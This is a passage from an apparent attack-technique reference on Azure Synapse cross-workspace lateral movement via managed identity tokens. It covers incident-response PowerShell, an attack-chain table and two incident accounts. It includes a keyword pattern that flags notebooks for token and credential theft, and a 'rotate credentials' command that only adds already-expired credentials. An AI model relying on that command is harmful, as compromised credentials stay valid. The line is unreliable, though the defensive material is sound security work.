# Managed identities cannot be rotated directly; requires full workspace recreation in extreme cases

# Rotate all service principal credentials
Get-AzADServicePrincipal | Where-Object { $_.DisplayName -match "synapse|analytics" } | ForEach-Object {
    New-AzADServicePrincipalCredential -ServicePrincipalId $_.Id -EndDate (Get-Date).AddDays(-1)
}
```

**3. Investigate:**

```powershell
# Export audit logs for investigation
$auditLogs = Get-AzActivityLog -ResourceGroupName $resourceGroupName `
    -ResourceType "Microsoft.Synapse/workspaces" `
    -StartTime (Get-Date).AddDays(-7)

$auditLogs | Export-Csv -Path "synapse_audit_investigation.csv" -NoTypeInformation

# Check for suspicious notebooks
Get-AzSynapseNotebook -WorkspaceName $workspaceName | ForEach-Object {
    $definition = Get-AzSynapseNotebookDefinition -WorkspaceName $workspaceName -Name $_.Name
    if ($definition -match "IMDS|metadata|token|credentials|password") {
        Write-Host "SUSPICIOUS: Notebook '$($_.Name)' contains potential credential access code"
    }
}
```

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker tricks user into granting OAuth consent to malicious app |
| **2** | **Credential Access** | [CA-DUMP-003] LSASS Credential Dumping | Attacker gains admin access and dumps LSASS for credential material |
| **3** | **Privilege Escalation** | [PE-ENTRA-008] Workspace Admin Impersonation | Attacker assumes workspace admin role via service principal |
| **4** | **Lateral Movement (Current)** | **[LM-AUTH-035]** | **Synapse workspace cross-access using extracted managed identity tokens** |
| **5** | **Data Exfiltration** | [EXFIL-002] Bulk SQL Data Export | Attacker exports sensitive analytics data to external storage |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Multi-Tenant Synapse Credential Breach (2022)

- **Target Sector:** Financial Services, using shared Azure subscriptions with multiple Synapse workspaces
- **Timeline:** March 2022 - Vulnerability discovered; April 2022 - Microsoft patched
- **Technique Status:** FIXED in April 2022; earlier versions vulnerable
- **Attack Details:**
  - Attacker gained developer access to one Synapse workspace
  - Created Python notebook extracting workspace managed identity token
  - Used token to enumerate other workspaces in shared subscription
  - Accessed SQL pools containing customer transaction data
  - Queried `sys.database_credentials` to find credentials for external data warehouses
  - Exfiltrated customer financial records over 3 months
- **Impact:** Multiple customers' financial data compromised; regulatory fines issued
- **Reference:** Internal Microsoft case study

### Example 2: Shared Service Principal Credential Reuse (2023)

- **Target Sector:** Healthcare, using shared service principal across multiple analytics pipelines
- **Timeline:** January 2023 - Compromise detected via audit logs
- **Technique Status:** ACTIVE - Organizational misconfiguration
- **Attack Details:**
  - Insider threat actor gained access to one Synapse notebook
  - Hardcoded service principal credentials in Git commit
  - Attacker forked repo and extracted credentials
  - Reused credentials to access 5 other Synapse workspaces in same tenant
  - Accessed patient medical records stored in SQL pools
  - Maintained persistent access via additional service principal creation
- **Impact:** HIPAA violation; 50,000+ patient records compromised
- **Mitigation:** Implemented credential scanning in CI/CD, enforced managed identities, separated service principals per workspace
- **Reference:** HIPAA Breach Notification Database

---

## REFERENCES & DOCUMENTATION

### Official Microsoft Documentation
- [Synapse Workspace Access Control - Microsoft Learn](https://learn.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-access-control-overview)
- [Configure Managed Virtual Networks - Microsoft Docs](https://learn.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-vnet)
- [Enable SQL Auditing - Microsoft Learn](https://learn.microsoft.com/en-us/azure/synapse-analytics/sql-data-warehouse/sql-data-warehouse-overview-what-is)

### Security Research
- [SynLapse Vulnerability - Orca Security](https://orca.security/resources/blog/synlapse-critical-azure-synapse-analytics-service-vulnerability/)
- [Azure Lateral Movement Guide - XM Cyber](https://xmcyber.com/blog/privilege-escalation-and-lateral-movement-on-azure-part-2/)

---